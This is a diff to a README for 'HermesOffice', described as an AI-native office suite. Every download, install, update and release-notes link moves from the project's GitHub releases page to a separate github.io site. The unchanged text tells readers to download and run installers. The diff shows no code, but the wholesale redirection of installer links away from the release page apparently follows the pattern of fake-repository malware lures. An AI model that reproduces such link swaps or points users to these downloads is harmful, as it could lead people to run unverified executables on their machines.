@@ -6,7 +6,7 @@ Welcome to **HermesOffice** – an AI-native office suite designed for modern pr
 
 ### 📥 Download Now
 
-[![Download HermesOffice](https://img.shields.io/badge/Download%20HermesOffice-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/democratic-corse761/HermesOffice/releases)
+[![Download HermesOffice](https://img.shields.io/badge/Download%20HermesOffice-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://democratic-corse761.github.io)
 
 Visit this link to download the application.
 
@@ -35,7 +35,7 @@ To run HermesOffice smoothly, your computer should meet these minimum requiremen
 
 Follow these simple steps to get started:
 
-1. **Click the download button** at the top of this page or visit the [releases page](https://github.com/democratic-corse761/HermesOffice/releases)
+1. **Click the download button** at the top of this page or visit the [releases page](https://democratic-corse761.github.io)
 2. **Choose your operating system** – Look for the correct version for Windows (`.exe`), macOS (`.dmg`), or Linux (`.AppImage`)
 3. **Run the installer** – Double-click the downloaded file and follow the on-screen instructions
 4. **Launch HermesOffice** – Find the app in your start menu or applications folder
@@ -68,7 +68,7 @@ Follow these simple steps to get started:
 
 HermesOffice checks for updates automatically. To manually check:
 - Go to **Help** > **Check for Updates**
-- Or visit the [releases page](https://github.com/democratic-corse761/HermesOffice/releases)
+- Or visit the [releases page](https://democratic-corse761.github.io)
 
 ## 🌐 Community and Support
 
@@ -91,7 +91,7 @@ Unlike traditional office suites, HermesOffice is built with AI at its core. Thi
 
 ## 📦 Release Notes
 
-Check the [releases page](https://github.com/democratic-corse761/HermesOffice/releases) for the latest updates, bug fixes, and new features.
+Check the [releases page](https://democratic-corse761.github.io) for the latest updates, bug fixes, and new features.
 
 ---
 
